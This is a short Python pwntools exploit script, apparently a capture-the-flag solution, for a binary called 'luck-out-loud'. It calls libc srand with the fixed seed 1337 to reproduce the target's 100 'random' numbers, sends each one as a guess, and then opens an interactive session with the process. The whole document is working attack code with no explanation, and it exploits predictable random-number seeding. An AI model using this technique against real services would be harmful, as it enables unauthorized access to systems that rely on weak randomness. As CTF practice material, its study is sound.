#!/usr/bin/python3
from pwn import *
from ctypes import *
import ctypes

elf = context.binary = ELF("./luck-out-loud", checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
#context.encoding = 'ascii'

gs = \
'''
continue
'''

IP = "localhost" #8884
PORT = 4242     

def start(logging='notset'):
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(IP, PORT, level=logging)
    else:
        return process(elf.path, level=logging)

def get_rand(seed, count):
    clibc = CDLL("libc.so.6")
     
    clibc.srand(seed)                
    
    rand_values = []
    for i in range(count):
        rand_values.append(clibc.rand())
    return rand_values

def pwn():
    io = start()
    
    r = []
    r = get_rand(1337, 100)

    for i in range(100):
        io.sendlineafter(b"Enter your guess for the random number: ", str(r[i]).encode())
    
    io.interactive()


if __name__ == "__main__":
    pwn()
   

   